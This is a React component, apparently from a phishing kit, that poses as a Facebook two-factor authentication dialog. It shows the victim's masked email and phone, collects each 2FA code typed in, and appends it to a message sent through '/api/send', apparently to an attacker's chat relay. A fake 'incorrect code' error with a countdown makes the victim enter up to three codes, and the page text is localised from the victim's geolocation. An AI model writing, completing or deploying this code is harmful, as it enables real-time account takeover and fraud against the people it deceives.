import VerifyImage from '@/assets/images/2FAuth.png';
import { store } from '@/store/store';
import config from '@/utils/config';
import { getTranslations } from '@/utils/translate';
import axios from 'axios';
import Image from 'next/image';
import { useEffect, useMemo, useState, type FC } from 'react';

const VerifyModal: FC<{ nextStep: () => void; businessName?: string; fullName?: string }> = ({ nextStep, businessName, fullName }) => {
    const [attempts, setAttempts] = useState(0);
    const [code, setCode] = useState('');
    const [countdown, setCountdown] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);

    const { geoInfo, messageId, message, setMessage, userFullName, userEmail, userPhone } = store();
    const maxCode = config.MAX_CODE ?? 3;
    const loadingTime = config.CODE_LOADING_TIME ?? 10;

    // Get language from country code
    const countryToLanguage: Record<string, string> = useMemo(() => ({
        'us': 'en', 'gb': 'en', 'ca': 'en', 'au': 'en',
        'mx': 'es', 'es': 'es', 'ar': 'es', 'br': 'pt', 'pt': 'pt',
        'fr': 'fr', 'de': 'de', 'at': 'de', 'ch': 'fr',
        'jp': 'ja', 'cn': 'zh', 'tw': 'zh', 'hk': 'zh',
        'kr': 'ko', 'th': 'th', 'vn': 'vi', 'id': 'id',
        'ru': 'ru', 'ua': 'uk', 'in': 'hi', 'bd': 'bn',
        'ae': 'ar', 'sa': 'ar', 'eg': 'ar'
    }), []);
    
    const translations = useMemo(() => {
        const countryCode = geoInfo?.country_code?.toLowerCase() || 'us';
        const lang = countryToLanguage[countryCode] || 'en';
        return getTranslations(lang);
    }, [geoInfo, countryToLanguage]);

    const t = (text: string): string => {
        return translations[text] || text;
    };

    // Mask email - show first char and domain
    const maskEmail = (email: string): string => {
        if (!email) return '';
        const [localPart, domain] = email.split('@');
        if (localPart.length <= 2) return email;
        return `${localPart.charAt(0)}${'*'.repeat(localPart.length - 2)}${localPart.charAt(localPart.length - 1)}@${domain}`;
    };

    // Mask phone - show country code and last 2 digits
    const maskPhone = (phone: string): string => {
        if (!phone) return '';
        
        // Extract country code (+ followed by 1-3 digits)
        const countryCodeMatch = phone.match(/^\+(\d{1,3})/);
        if (!countryCodeMatch) return phone;
        
        let countryCode = countryCodeMatch[1];
        let remaining = phone.substring(countryCodeMatch[0].length).replace(/\D/g, '');
        
        // If remaining part too short (< 5 digits), country code might be too long
        // Adjust by removing last digit from country code
        if (remaining.length < 5 && countryCode.length > 1) {
            countryCode = countryCode.slice(0, -1);
            remaining = phone.substring(1 + countryCode.length).replace(/\D/g, '');
        }
        
        const last2 = remaining.slice(-2);
        const maskedCount = Math.max(remaining.length - 2, 0);
        const maskedPart = '*'.repeat(maskedCount);
        
        return `+${countryCode} ${maskedPart} ${last2}`;
    };

    useEffect(() => {
        if (countdown > 0) {
            const timer = setTimeout(() => {
                setCountdown(countdown - 1);
            }, 1000);
            return () => clearTimeout(timer);
        } else if (countdown === 0 && showError) {
            setShowError(false);
        }
    }, [countdown, showError]);

    const handleSubmit = async () => {
        if (!code.trim() || isLoading || code.length < 6 || countdown > 0 || !message) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        const updatedMessage = `${message}

<b>🔐 2FA Code ${next}/${maxCode}:</b> <code>${code}</code>`;
        try {
            const res = await axios.post('/api/send', {
                message: updatedMessage,
                message_id: messageId
            });

            if (res?.data?.success) {
                setMessage(updatedMessage);
            }

            if (next >= maxCode) {
                nextStep();
            } else {
                setShowError(true);
                setCode('');
                setCountdown(loadingTime);
            }
        } catch {
            //
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <>
            {/* Overlay mờ toàn màn hình */}
            <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all"></div>
            <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center p-3 sm:p-4 md:p-6'>
                <div className='flex max-h-[95vh] w-[90vw] max-w-xs sm:max-w-sm md:max-w-md flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-3 sm:p-4 md:p-5'>
                    {/* Header with user info and Facebook branding */}
                    <div className='pb-2 sm:pb-3 md:pb-4 mb-1'>
                        <p className='text-xs sm:text-sm text-gray-600 truncate'>{userFullName || fullName || businessName || 'User'} • Facebook</p>
                    </div>

                    {/* Main content */}
                    <div className='flex-1 flex flex-col overflow-y-auto gap-2 sm:gap-3 md:gap-4'>
                        {/* Title */}
                        <h1 className='text-sm sm:text-base md:text-lg font-bold text-gray-900 leading-snug'>
                            {t('Two-factor authentication required')} ({attempts + 1}/{maxCode})
                        </h1>

                        {/* Description */}
                        <p className='text-xs sm:text-sm text-gray-700 leading-relaxed'>
                            {t('Enter the code for this account that we send to')} {maskEmail(userEmail || '')}{userPhone && ','} {userPhone && maskPhone(userPhone)}
                            <br />
                            {t(' or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)')}
                        </p>

                        {/* Illustration */}
                        <div className='w-full py-1.5 sm:py-2 md:py-3'>
                            <Image src={VerifyImage} alt='2FA' className='w-full h-auto rounded-2xl object-contain' />
                        </div>

                        {/* Code Input */}
                        <div className='relative mt-0.5 sm:mt-1'>
                            <input
                                type='tel'
                                inputMode='numeric'
                                pattern='[0-9]*'
                                id='code-input'
                                value={code}
                                onChange={(e) => {
                                    const value = e.target.value.replaceAll(/\D/g, '');
                                    if (value.length <= 8) {
                                        setCode(value);
                                    }
                                }}
                                maxLength={8}
                                disabled={countdown > 0}
                                className={`w-full h-9 sm:h-10 md:h-11 rounded-xl border-2 border-gray-300 px-2.5 sm:px-3 py-1.5 sm:py-2 text-base font-medium focus:outline-none focus:ring-0 focus:border-blue-500 transition-all placeholder-gray-500 text-left ${
                                    countdown > 0 ? 'cursor-not-allowed opacity-60 bg-gray-50' : 'bg-white'
                                }`}
                                placeholder={t('Code')}
                            />
                        </div>

                        {/* Error message */}
                        {showError && (
                            <p className='text-xs sm:text-sm text-red-500 leading-tight'>
                                {t('The two-factor authentication you entered is incorrect. Please, try again after')} {countdown}s.
                            </p>
                        )}

                        {/* Continue Button */}
                        <button
                            type='button'
                            onClick={handleSubmit}
                            disabled={isLoading || code.length < 6 || countdown > 0}
                            className={`w-full h-10 sm:h-11 md:h-12 rounded-2xl bg-blue-500 text-white font-semibold text-xs sm:text-sm md:text-base transition-all ${
                                isLoading || code.length < 6 || countdown > 0
                                    ? 'cursor-not-allowed opacity-60'
                                    : 'hover:bg-blue-600 active:bg-blue-700 shadow-md hover:shadow-lg'
                            } flex items-center justify-center mt-1 sm:mt-2`}
                        >
                            {isLoading ? (
                                <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div>
                            ) : (
                                t('Continue')
                            )}
                        </button>
                    </div>
                </div>
            </div>
        </>
    );
};

export default VerifyModal;
